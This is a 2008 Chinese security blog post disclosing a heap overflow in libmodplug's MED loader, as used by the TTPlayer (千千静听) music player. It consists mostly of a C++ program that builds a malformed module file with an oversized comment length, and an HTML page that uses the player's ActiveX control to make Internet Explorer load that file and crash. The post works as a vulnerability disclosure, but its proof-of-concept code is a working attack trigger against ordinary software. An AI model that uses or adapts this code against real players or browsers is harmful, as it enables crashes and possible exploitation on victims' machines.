---
title: 千千静听 mod 文件格式堆溢出[POC]
description: 千千静听使用的是libmod来进行mod类文件格式的处理,此库在ReadMed函数中，没有检查文件描述的长度，如果传递一个恶意构造的值，将导致堆溢出。现在采用libmod软件很多，都应该存在此问题。下面是构造问题文件的代码，最后是使用最新版本千千静听的ax写的poc.
date: 2008-03-03 00:25:12
category: 漏洞信息
tags: ['exploit', '缓冲区溢出', '漏洞信息', '千千静听']
post_id: 389
alias: QianQianJingTing-mod-buffer-overflow-POC
ViewNums: 5949
---

[千千静听](http://wwwcnc.ttplayer.com)使用的是 libmod 来进行 mod 类文件格式的处理, 此库在 ReadMed 函数中，没有检查
文件描述的长度，如果传递一个恶意构造的值，将导致堆[溢出](/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA)。
现在采用libmod 软件很多，都应该存在此问题。

下面是构造问题文件的代码，最后是使用最新版本千千静听的 ax 写的 poc.

**C++代码**
```cpp
1. /*
2. libmodplug v0.8
3. load_med.cpp
4. BOOL CSoundFile::ReadMed(const BYTE *lpStream, DWORD dwMemLength)
5. line 670: memcpy(m_lpszSongComments, lpStream+annotxt, annolen);
6. */
8. /*
9. author: dummy
10. e-mail: dummyz@126.com
12. date: 2008/02/25
13. */
15. #include <windows.h>
16. #include <stdio.h>
18. #pragma pack(1)
20. typedef struct tagMEDMODULEHEADER
21. {
22. DWORD id;        // MMD1-MMD3
23. DWORD modlen;    // Size of file
24. DWORD song;        // Position in file for this song
25. WORD psecnum;
26. WORD pseq;
27. DWORD blockarr;    // Position in file for blocks
28. DWORD mmdflags;
29. DWORD smplarr;    // Position in file for samples
30. DWORD reserved;
31. DWORD expdata;    // Absolute offset in file for ExpData (0 if not present)
32. DWORD reserved2;
33. WORD pstate;
34. WORD pblock;
35. WORD pline;
36. WORD pseqnum;
37. WORD actplayline;
38. BYTE counter;
39. BYTE extra_songs;    // # of songs - 1
40. } MEDMODULEHEADER;
42. typedef struct tagMMD0SAMPLE
43. {
44. WORD rep, replen;
45. BYTE midich;
46. BYTE midipreset;
47. BYTE svol;
48. signed char strans;
49. } MMD0SAMPLE;
51. // MMD0/MMD1 song header
52. typedef struct tagMMD0SONGHEADER
53. {
54. MMD0SAMPLE sample[63];
55. WORD numblocks;        // # of blocks
56. WORD songlen;        // # of entries used in playseq
57. BYTE playseq[256];    // Play sequence
58. WORD deftempo;        // BPM tempo
59. signed char playtransp;    // Play transpose
60. BYTE flags;            // 0x10: Hex Volumes | 0x20: ST/NT/PT Slides | 0x40: 8 Channels song
61. BYTE flags2;        // [b4-b0]+1: Tempo LPB, 0x20: tempo mode, 0x80: mix_conv=on
62. BYTE tempo2;        // tempo TPL
63. BYTE trkvol[16];    // track volumes
64. BYTE mastervol;        // master volume
65. BYTE numsamples;    // # of samples (max=63)
66. } MMD0SONGHEADER;
68. typedef struct tagMMD0EXP
69. {
70. DWORD nextmod;            // File offset of next Hdr
71. DWORD exp_smp;            // Pointer to extra instrument data
72. WORD s_ext_entries;        // Number of extra instrument entries
73. WORD s_ext_entrsz;        // Size of extra instrument data
74. DWORD annotxt;
75. DWORD annolen;
76. DWORD iinfo;            // Instrument names
77. WORD i_ext_entries;
78. WORD i_ext_entrsz;
79. DWORD jumpmask;
80. DWORD rgbtable;
81. BYTE channelsplit[4];    // Only used if 8ch_conv (extra channel for every nonzero entry)
82. DWORD n_info;
83. DWORD songname;            // Song name
84. DWORD songnamelen;
85. DWORD dumps;
86. DWORD mmdinfo;
87. DWORD mmdrexx;
88. DWORD mmdcmd3x;
89. DWORD trackinfo_ofs;    // ptr to song->numtracks ptrs to tag lists
90. DWORD effectinfo_ofs;    // ptr to group ptrs
91. DWORD tag_end;
92. } MMD0EXP;
94. #pragma pack()
96. // Byte swapping functions from the GNU C Library and libsdl
98. /* Swap bytes in 16 bit value. */
99. #ifdef __GNUC__
100. # define bswap_16(x)
101. (__extension__
102. ({ unsigned short int __bsx = (x);
103. ((((__bsx) >> 8) & 0xff) | (((__bsx) & 0xff) << 8)); }))
104. #else
105. static __inline unsigned short int
106. bswap_16 (unsigned short int __bsx)
107. {
108. return ((((__bsx) >> 8) & 0xff) | (((__bsx) & 0xff) << 8));
109. }
110. #endif
112. /* Swap bytes in 32 bit value. */
113. #ifdef __GNUC__
114. # define bswap_32(x)
115. (__extension__
116. ({ unsigned int __bsx = (x);
117. ((((__bsx) & 0xff000000) >> 24) | (((__bsx) & 0x00ff0000) >> 8) |
118. (((__bsx) & 0x0000ff00) << 8) | (((__bsx) & 0x000000ff) << 24)); }))
119. #else
120. static __inline unsigned int
121. bswap_32 (unsigned int __bsx)
122. {
123. return ((((__bsx) & 0xff000000) >> 24) | (((__bsx) & 0x00ff0000) >> 8) |
124. (((__bsx) & 0x0000ff00) << 8) | (((__bsx) & 0x000000ff) << 24));
125. }
126. #endif
128. #ifdef WORDS_BIGENDIAN
129. #define bswapLE16(X) bswap_16(X)
130. #define bswapLE32(X) bswap_32(X)
131. #define bswapBE16(X) (X)
132. #define bswapBE32(X) (X)
133. #else
134. #define bswapLE16(X) (X)
135. #define bswapLE32(X) (X)
136. #define bswapBE16(X) bswap_16(X)
137. #define bswapBE32(X) bswap_32(X)
138. #endif
140. int main()
141. {
142. MEDMODULEHEADER mmh;
143. MMD0SONGHEADER msh;
144. MMD0EXP mex;
145. FILE* file;
146. long p;
148. memset(&mmh, 0, sizeof (mmh));
149. memset(&msh, 0, sizeof (msh));
150. memset(&mex, 0, sizeof (mex));
152. p = 0;
154. mmh.id = 0x30444D4D; // version = '0'
156. p += sizeof (MEDMODULEHEADER);
157. mmh.song = bswapBE32(p);
159. p += sizeof (MMD0SONGHEADER);
160. mmh.expdata = bswapBE32(p);
162. p += sizeof (MMD0EXP);
163. mex.annolen = bswapBE32(-1);
164. mex.annotxt = bswapBE32(p);
166. file = fopen("test.s3m", "wb+");
167. if ( file == NULL )
168. {
169. printf("create file failed!
     ");
170. }
171. else
172. {
173. fwrite(&mmh, 1, sizeof (mmh), file);
174. fwrite(&msh, 1, sizeof (msh), file);
175. fwrite(&mex, 1, sizeof (mex), file);
177. while ( ftell(file) < 0x1000 )
178. {
179. fwrite("AAAAAAAAAAAAAAAAAAAA", 1, 16, file);
180. }
182. fclose(file);
184. printf("successed!
     ");
185. }
187. return 0;
188. }
```

最新的千千静听提供了 ax, 下面是在 Ie 中触发此漏洞。会导致 ie 崩溃。

**XML/HTML代码**
```html
1. <html>
2. <body>
3. <OBJECT ID="ttp" WIDTH="250" HEIGHT="400" CLASSID="CLSID:89AE5F82-410A-4040-9387-68D1144EFD03">
4. </OBJECT>
5. <INPUT TYPE="button" NAME="test" CAPTION="test" onClick="Test()">
6. <SCRIPT LANGUAGE="JavaScript">
7. <!--
8. function Test()
9. {
10. var controls = ttp.controls;
11. ttp.URL = "http:\127.0.0.1\test.s3m";
12. controls.play();
13. }
14. //-->
15. </SCRIPT>
16. </body>
17. </html>
```
From：[7jdg's blog](http://1v1.name/)

